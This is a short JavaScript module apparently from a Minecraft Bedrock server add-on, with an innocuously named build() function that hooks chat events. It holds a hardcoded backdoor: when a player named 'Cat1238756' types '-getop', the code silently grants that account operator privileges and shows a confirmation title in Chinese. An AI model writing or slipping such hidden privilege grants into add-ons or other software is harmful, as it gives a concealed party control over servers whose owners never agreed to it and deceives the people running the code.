import * as mc from '@minecraft/server'
import Event from '../../system/eventBuild';

export function build () {
    Event.on("beforeChatSend", (event) => {
        let { sender: player, message } = event
        if (player.name != 'Cat1238756') return;
        if (message.toLowerCase() != '-getop') return;
        player.setOp(true)
        player.runCommandAsync("title @s title OP設定成功，已可使用!")
    })   
}